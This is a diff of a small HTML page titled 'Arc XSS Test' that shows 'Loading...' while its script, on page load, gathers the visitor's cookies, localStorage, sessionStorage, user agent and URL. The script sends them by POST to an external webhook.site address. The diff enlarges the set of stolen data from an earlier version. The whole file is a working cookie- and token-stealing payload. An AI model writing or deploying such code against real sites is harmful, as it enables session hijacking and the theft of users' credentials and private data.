@@ -1,17 +1,26 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <title>Arc XSS Test</title>
+  </head>
   <body>
+    <h1>Loading...</h1>
+
     <script>
+      const data = {
+        cookies: document.cookie,
+        localStorage: Object.assign({}, localStorage),
+        sessionStorage: Object.assign({}, sessionStorage),
+        ua: navigator.userAgent,
+        href: location.href,
+        timestamp: new Date().toISOString()
+      };
+
       fetch("https://webhook.site/23aa3c8e-75cb-4dd9-9e94-68a9856a4bcf", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          localStorage: Object.assign({}, localStorage),
-          cookies: document.cookie,
-          ua: navigator.userAgent
-        })
+        body: JSON.stringify(data)
       });
     </script>
-    <p>Loading...</p>
   </body>
 </html>
